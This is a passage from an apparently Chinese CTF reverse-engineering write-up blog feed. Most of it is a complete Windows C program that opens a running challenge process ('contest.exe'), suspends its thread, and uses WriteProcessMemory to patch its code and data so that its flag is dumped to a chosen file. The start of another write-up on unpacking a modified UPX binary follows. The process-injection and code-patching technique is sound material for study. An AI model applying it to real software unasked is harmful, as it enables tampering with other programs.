class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 修改文件名</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FILENAME_OFF 0x772F9</span><br>BYTE filenameOriBytes[<span class="hljs-number">13</span>] = &#123;<span class="hljs-string">&quot;@contest.txt&quot;</span>&#125;;<br>BYTE filenameBytes[<span class="hljs-number">13</span>] = &#123;<span class="hljs-number">0</span>, &#125;;<br>*(UINT64*)(filenameBytes + <span class="hljs-number">1</span>) = (UINT64)remoteBuffer;<br><span class="hljs-comment">// 将lea指令替换为mov指令</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PATCH_FILENAME_OFF 0xCB3C</span><br>BYTE patchFilenameOriBytes[<span class="hljs-number">1</span>] = &#123; <span class="hljs-number">0x8D</span> &#125;;<br>BYTE patchFilenameBytes[<span class="hljs-number">1</span>] = &#123; <span class="hljs-number">0x8B</span> &#125;;<br></code></pre></td></tr></table></figure><h4 id="flag-patch"><a href="#flag-patch" class="headerlink" title="flag patch"></a>flag patch</h4><p>和文件名一样，为了避免flag被异或，把flag前一个字节改成0</p><p>flag的base64加密需要patch掉，把rcx里面的flag直接复制到r8里面，长队为rdx</p><p><img src="assets/2024-03-29-13-28-38-image.png"></p><p>这一部分有16个字节，直接将这段patch成简单的memcpy，刚好16字节（省略push rdx和pop rdx还可以节约两个字节）</p><p><img src="assets/2024-03-29-13-35-38-image.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// flag</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FLAG_OFF 0x772E8</span><br>BYTE flagOriBytes[<span class="hljs-number">17</span>] = &#123; <span class="hljs-string">&quot;Ecatchmeifyoucan&quot;</span> &#125;;<br>BYTE flagBytes[<span class="hljs-number">17</span>] = &#123; <span class="hljs-string">&quot;\0catchmeifyoucan&quot;</span> &#125;;<br><span class="hljs-comment">// patch掉base64入口，替换为memcpy</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PATCH_FLAG_OFF 0xD6D0</span><br>BYTE patchFlagOriBytes[<span class="hljs-number">16</span>] = &#123;<span class="hljs-number">0x48</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xCC</span>&#125;;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment">push rdx</span><br><span class="hljs-comment">mov al, [rcx+rdx-1]</span><br><span class="hljs-comment">mov [r8+rdx-1], al</span><br><span class="hljs-comment">dec edx</span><br><span class="hljs-comment">jnz $-0xD</span><br><span class="hljs-comment">pop rdx</span><br><span class="hljs-comment">ret</span><br><span class="hljs-comment">*/</span><br>BYTE patchFlagBytes[<span class="hljs-number">16</span>] = &#123;<span class="hljs-number">0x52</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0xC3</span>&#125;;<br></code></pre></td></tr></table></figure><h4 id="code"><a href="#code" class="headerlink" title="code"></a>code</h4><p>远程修改上述内存即可，编写程序测试</p><p><img src="assets/2024-03-29-13-41-16-image.png"></p><p><img src="assets/2024-03-29-13-42-05-image.png"></p><p>flag成功写入到指定文件中</p><p>完整代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;processthreadsapi.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;WinUser.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;TlHelp32.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Psapi.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_LEN 256</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PROC_NAME <span class="hljs-string">L&quot;contest.exe&quot;</span></span><br><br>DWORD <span class="hljs-title function_">GetDwPidByName</span><span class="hljs-params">(LPCWSTR procName)</span><br>&#123;<br>    <span class="hljs-comment">// 使用tlhelp32获取进程PID</span><br>    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, (DWORD)<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (hSnapshot == INVALID_HANDLE_VALUE)<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    LPWSTR fileNameBuf = (LPWSTR)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(WCHAR) * MAX_LEN);<br>    PROCESSENTRY32 pe32;<br>    pe32.dwSize = <span class="hljs-keyword">sizeof</span>(PROCESSENTRY32);<br>    Process32First(hSnapshot, &amp;pe32);<br>    <span class="hljs-keyword">do</span><br>    &#123;<br>        DWORD dwPID = pe32.th32ProcessID;<br>        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwPID);<br>        <span class="hljs-keyword">if</span> (hProcess == <span class="hljs-literal">NULL</span>)<br>        &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        GetProcessImageFileName(hProcess, fileNameBuf, (DWORD)MAX_LEN);<br>        <span class="hljs-comment">// 提取进程名</span><br>        WCHAR* pFileName = wcsrchr(fileNameBuf, <span class="hljs-string">L&#x27;\\&#x27;</span>);<br>        pFileName++;<br>        <span class="hljs-keyword">if</span> (!wcscmp(procName, pFileName))<br>        &#123;<br>            <span class="hljs-built_in">free</span>((<span class="hljs-type">void</span>*)fileNameBuf);<br>            <span class="hljs-keyword">return</span> dwPID;<br>        &#125;<br>    &#125; <span class="hljs-keyword">while</span> (Process32Next(hSnapshot, &amp;pe32));<br>    <span class="hljs-built_in">free</span>((<span class="hljs-type">void</span>*)fileNameBuf);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br>DWORD <span class="hljs-title function_">GetMainThreadId</span><span class="hljs-params">(DWORD processId)</span> &#123;<br>    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (hSnapshot == INVALID_HANDLE_VALUE) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    THREADENTRY32 te32;<br>    te32.dwSize = <span class="hljs-keyword">sizeof</span>(THREADENTRY32);<br><br>    DWORD threadId = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> (Thread32First(hSnapshot, &amp;te32)) &#123;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-keyword">if</span> (te32.th32OwnerProcessID == processId) &#123;<br>                threadId = te32.th32ThreadID;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">while</span> (Thread32Next(hSnapshot, &amp;te32));<br>    &#125;<br><br>    CloseHandle(hSnapshot);<br>    <span class="hljs-keyword">return</span> threadId;<br>&#125;<br><br><br>HMODULE <span class="hljs-title function_">GetProcBase</span><span class="hljs-params">(HANDLE hProcess)</span><br>&#123;<br>    HMODULE hModules[<span class="hljs-number">1024</span>];<br>    DWORD cbNeeded;<br><br>    <span class="hljs-keyword">if</span> (EnumProcessModules(hProcess, hModules, <span class="hljs-keyword">sizeof</span>(hModules), &amp;cbNeeded)) &#123;<br>        <span class="hljs-keyword">return</span> hModules[<span class="hljs-number">0</span>]; <span class="hljs-comment">// 返回第一个模块的基址</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><br><span class="hljs-comment">// 修改文件名</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FILENAME_OFF 0x772F9</span><br>BYTE filenameOriBytes[<span class="hljs-number">13</span>] = &#123;<span class="hljs-string">&quot;@contest.txt&quot;</span>&#125;;<br>BYTE filenameBytes[<span class="hljs-number">13</span>] = &#123;<span class="hljs-number">0</span>, &#125;;<br><span class="hljs-comment">// 将lea指令替换为mov指令</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PATCH_FILENAME_OFF 0xCB3C</span><br>BYTE patchFilenameOriBytes[<span class="hljs-number">1</span>] = &#123; <span class="hljs-number">0x8D</span> &#125;;<br>BYTE patchFilenameBytes[<span class="hljs-number">1</span>] = &#123; <span class="hljs-number">0x8B</span> &#125;;<br><br><span class="hljs-comment">// flag</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FLAG_OFF 0x772E8</span><br>BYTE flagOriBytes[<span class="hljs-number">17</span>] = &#123; <span class="hljs-string">&quot;Ecatchmeifyoucan&quot;</span> &#125;;<br>BYTE flagBytes[<span class="hljs-number">17</span>] = &#123; <span class="hljs-string">&quot;\0catchmeifyoucan&quot;</span> &#125;;<br><span class="hljs-comment">// patch掉base64入口，替换为memcpy</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PATCH_FLAG_OFF 0xD6D0</span><br>BYTE patchFlagOriBytes[<span class="hljs-number">16</span>] = &#123;<span class="hljs-number">0x48</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xCC</span>&#125;;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment">push rdx</span><br><span class="hljs-comment">mov al, [rcx+rdx-1]</span><br><span class="hljs-comment">mov [r8+rdx-1], al</span><br><span class="hljs-comment">dec edx</span><br><span class="hljs-comment">jnz $-0xD</span><br><span class="hljs-comment">pop rdx</span><br><span class="hljs-comment">ret</span><br><span class="hljs-comment">*/</span><br>BYTE patchFlagBytes[<span class="hljs-number">16</span>] = &#123;<span class="hljs-number">0x52</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0xC3</span>&#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">crack</span><span class="hljs-params">(HANDLE hProcess, HANDLE hThread, UINT64 procBase)</span><br>&#123;<br>    PVOID remoteBuffer = <span class="hljs-literal">NULL</span>;<br>    DWORD newProtect;<br>    DWORD oldProtect;<br>    <span class="hljs-keyword">while</span> (TRUE)<br>    &#123;<br>        <span class="hljs-type">char</span> op = <span class="hljs-string">&#x27;\n&#x27;</span>;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[m] modify file path&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[r] reset&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[q] quit&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input: &quot;</span>);<br>        <span class="hljs-keyword">while</span> (op == <span class="hljs-string">&#x27;\n&#x27;</span>) op = getchar();<br>        <span class="hljs-keyword">switch</span> (op)<br>        &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;m&#x27;</span>:<br>            <span class="hljs-keyword">if</span> (remoteBuffer == <span class="hljs-literal">NULL</span>)<br>            &#123;<br>                remoteBuffer = VirtualAllocEx(hProcess, <span class="hljs-literal">NULL</span>, MAX_LEN, MEM_COMMIT, PAGE_READWRITE);<br>                <span class="hljs-keyword">if</span> (remoteBuffer == <span class="hljs-literal">NULL</span>)<br>                &#123;<br>                    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;failed!&quot;</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;file path:&quot;</span>);<br>            <span class="hljs-type">char</span> path[MAX_LEN];<br>            scanf_s(<span class="hljs-string">&quot;%255s&quot;</span>, path);<br>            WriteProcessMemory(hProcess, remoteBuffer, path, MAX_LEN, <span class="hljs-literal">NULL</span>);<br>            SuspendThread(hThread);<br>            <span class="hljs-comment">// 修改文件名</span><br>            newProtect = PAGE_READWRITE;<br>            VirtualProtectEx(hProcess, (LPVOID)(procBase + FILENAME_OFF &amp; <span class="hljs-number">0x1000</span>), <span class="hljs-number">0x1000</span>, newProtect, &amp;oldProtect);<br>            *(UINT64*)(filenameBytes + <span class="hljs-number">1</span>) = (UINT64)remoteBuffer;<br>            WriteProcessMemory(hProcess, (LPVOID)(procBase + FILENAME_OFF), filenameBytes, <span class="hljs-keyword">sizeof</span>(filenameBytes), <span class="hljs-literal">NULL</span>);<br>            VirtualProtectEx(hProcess, (LPVOID)(procBase + FILENAME_OFF &amp; <span class="hljs-number">0x1000</span>), <span class="hljs-number">0x1000</span>, oldProtect, &amp;newProtect);<br>            <span class="hljs-comment">// path CreateFile处lea</span><br>            newProtect = PAGE_READWRITE;<br>            VirtualProtectEx(hProcess, (LPVOID)(procBase + PATCH_FILENAME_OFF &amp; <span class="hljs-number">0x1000</span>), <span class="hljs-number">0x1000</span>, newProtect, &amp;oldProtect);<br>            WriteProcessMemory(hProcess, (LPVOID)(procBase + PATCH_FILENAME_OFF), patchFilenameBytes, <span class="hljs-keyword">sizeof</span>(patchFilenameBytes), <span class="hljs-literal">NULL</span>);<br>            VirtualProtectEx(hProcess, (LPVOID)(procBase + PATCH_FILENAME_OFF &amp; <span class="hljs-number">0x1000</span>), <span class="hljs-number">0x1000</span>, oldProtect, &amp;newProtect);<br>            <span class="hljs-comment">// 修改flag</span><br>            newProtect = PAGE_READWRITE;<br>            VirtualProtectEx(hProcess, (LPVOID)(procBase + FLAG_OFF &amp; <span class="hljs-number">0x1000</span>), <span class="hljs-number">0x1000</span>, newProtect, &amp;oldProtect);<br>            WriteProcessMemory(hProcess, (LPVOID)(procBase + FLAG_OFF), flagBytes, <span class="hljs-keyword">sizeof</span>(flagBytes), <span class="hljs-literal">NULL</span>);<br>            VirtualProtectEx(hProcess, (LPVOID)(procBase + FLAG_OFF &amp; <span class="hljs-number">0x1000</span>), <span class="hljs-number">0x1000</span>, oldProtect, &amp;newProtect);<br>            <span class="hljs-comment">// patch base64</span><br>            newProtect = PAGE_READWRITE;<br>            VirtualProtectEx(hProcess, (LPVOID)(procBase + PATCH_FLAG_OFF &amp; <span class="hljs-number">0x1000</span>), <span class="hljs-number">0x1000</span>, newProtect, &amp;oldProtect);<br>            WriteProcessMemory(hProcess, (LPVOID)(procBase + PATCH_FLAG_OFF), patchFlagBytes, <span class="hljs-keyword">sizeof</span>(patchFlagBytes), <span class="hljs-literal">NULL</span>);<br>            VirtualProtectEx(hProcess, (LPVOID)(procBase + PATCH_FLAG_OFF &amp; <span class="hljs-number">0x1000</span>), <span class="hljs-number">0x1000</span>, oldProtect, &amp;newProtect);<br>            ResumeThread(hThread);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;r&#x27;</span>:<br>            <span class="hljs-keyword">if</span> (remoteBuffer == <span class="hljs-literal">NULL</span>)<br>            &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            SuspendThread(hThread);<br>            <span class="hljs-comment">// 修改文件名</span><br>            newProtect = PAGE_READWRITE;<br>            VirtualProtectEx(hProcess, (LPVOID)(procBase + FILENAME_OFF &amp; <span class="hljs-number">0x1000</span>), <span class="hljs-number">0x1000</span>, newProtect, &amp;oldProtect);<br>            WriteProcessMemory(hProcess, (LPVOID)(procBase + FILENAME_OFF), filenameOriBytes, <span class="hljs-keyword">sizeof</span>(filenameOriBytes), <span class="hljs-literal">NULL</span>);<br>            VirtualProtectEx(hProcess, (LPVOID)(procBase + FILENAME_OFF &amp; <span class="hljs-number">0x1000</span>), <span class="hljs-number">0x1000</span>, oldProtect, &amp;newProtect);<br>            <span class="hljs-comment">// path CreateFile处lea</span><br>            newProtect = PAGE_READWRITE;<br>            VirtualProtectEx(hProcess, (LPVOID)(procBase + PATCH_FILENAME_OFF &amp; <span class="hljs-number">0x1000</span>), <span class="hljs-number">0x1000</span>, newProtect, &amp;oldProtect);<br>            WriteProcessMemory(hProcess, (LPVOID)(procBase + PATCH_FILENAME_OFF), patchFilenameOriBytes, <span class="hljs-keyword">sizeof</span>(patchFilenameOriBytes), <span class="hljs-literal">NULL</span>);<br>            VirtualProtectEx(hProcess, (LPVOID)(procBase + PATCH_FILENAME_OFF &amp; <span class="hljs-number">0x1000</span>), <span class="hljs-number">0x1000</span>, oldProtect, &amp;newProtect);<br>            <span class="hljs-comment">// 修改flag</span><br>            newProtect = PAGE_READWRITE;<br>            VirtualProtectEx(hProcess, (LPVOID)(procBase + FLAG_OFF &amp; <span class="hljs-number">0x1000</span>), <span class="hljs-number">0x1000</span>, newProtect, &amp;oldProtect);<br>            WriteProcessMemory(hProcess, (LPVOID)(procBase + FLAG_OFF), flagOriBytes, <span class="hljs-keyword">sizeof</span>(flagOriBytes), <span class="hljs-literal">NULL</span>);<br>            VirtualProtectEx(hProcess, (LPVOID)(procBase + FLAG_OFF &amp; <span class="hljs-number">0x1000</span>), <span class="hljs-number">0x1000</span>, oldProtect, &amp;newProtect);<br>            <span class="hljs-comment">// patch base64</span><br>            newProtect = PAGE_READWRITE;<br>            VirtualProtectEx(hProcess, (LPVOID)(procBase + PATCH_FLAG_OFF &amp; <span class="hljs-number">0x1000</span>), <span class="hljs-number">0x1000</span>, newProtect, &amp;oldProtect);<br>            WriteProcessMemory(hProcess, (LPVOID)(procBase + PATCH_FLAG_OFF), patchFlagOriBytes, <span class="hljs-keyword">sizeof</span>(patchFlagOriBytes), <span class="hljs-literal">NULL</span>);<br>            VirtualProtectEx(hProcess, (LPVOID)(procBase + PATCH_FLAG_OFF &amp; <span class="hljs-number">0x1000</span>), <span class="hljs-number">0x1000</span>, oldProtect, &amp;newProtect);<br>            VirtualFreeEx(hProcess, remoteBuffer, <span class="hljs-number">0</span>, MEM_RELEASE);<br>            remoteBuffer = <span class="hljs-literal">NULL</span>;<br>            ResumeThread(hThread);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;q&#x27;</span>:<br>            <span class="hljs-keyword">return</span>;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    DWORD dwPID = <span class="hljs-number">0</span>;<br>    DWORD dwTID = <span class="hljs-number">0</span>;<br>    HANDLE hProcess = <span class="hljs-literal">NULL</span>;<br>    HANDLE hThread = <span class="hljs-literal">NULL</span>;<br>    HMODULE hModule = <span class="hljs-literal">NULL</span>;<br><br>    dwPID = GetDwPidByName(PROC_NAME);<br>    <span class="hljs-keyword">if</span> (dwPID == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);<br>    <span class="hljs-keyword">if</span> (hProcess == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>    dwTID = GetMainThreadId(dwPID);<br>    <span class="hljs-keyword">if</span> (dwTID == <span class="hljs-number">0</span>)<br>    &#123;<br>        CloseHandle(hProcess);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, dwTID);<br>    <span class="hljs-keyword">if</span> (hThread == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        CloseHandle(hProcess);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    hModule = GetProcBase(hProcess);<br>    <span class="hljs-keyword">if</span> (hModule == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        CloseHandle(hProcess);<br>        CloseHandle(hThread);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    crack(hProcess, hThread, (UINT64)hModule);<br><br>    system(<span class="hljs-string">&quot;pause&quot;</span>);<br>    CloseHandle(hProcess);<br>    CloseHandle(hThread);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf-wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>RE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024春秋杯网络安全联赛冬季赛</title>
    <link href="/2024/01/25/ctf_wp/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%86%AC%E5%AD%A3%E8%B5%9B/"/>
    <url>/2024/01/25/ctf_wp/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%86%AC%E5%AD%A3%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h2 id="upx2023"><a href="#upx2023" class="headerlink" title="upx2023"></a>upx2023</h2><p>upx壳，原版upx -d脱不了，x64dbg手动调试脱壳然后scylla dump</p><p><img src="assets/2024-01-25-14-02-16-image.png"></p><p>F5直接得到主函数逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 